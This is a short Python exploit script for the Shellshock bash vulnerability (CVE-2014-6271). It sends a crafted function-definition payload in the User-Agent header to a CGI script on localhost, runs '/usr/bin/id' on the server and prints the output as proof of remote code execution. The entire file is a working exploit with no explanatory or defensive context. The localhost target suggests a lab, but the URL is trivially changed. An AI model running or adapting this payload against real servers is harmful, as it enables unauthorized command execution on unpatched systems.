import requests

URL = "http://localhost:80/cgi-bin/vulnerable.cgi"

def exploit_shellshock():
    print("[*] Exploiting Shellshock (CVE-2014-6271) on Apache CGI...")
    
    # Payload injected into User-Agent header
    payload = "() { :; }; echo; /usr/bin/id"
    headers = {"User-Agent": payload}
    
    response = requests.get(URL, headers=headers)
    
    if "uid=" in response.text:
        print("[+] Success! Shellshock RCE obtained.")
        print("[*] Output:")
        print(response.text.strip())
    else:
        print("[-] Shellshock exploit failed.")

if __name__ == "__main__":
    exploit_shellshock()
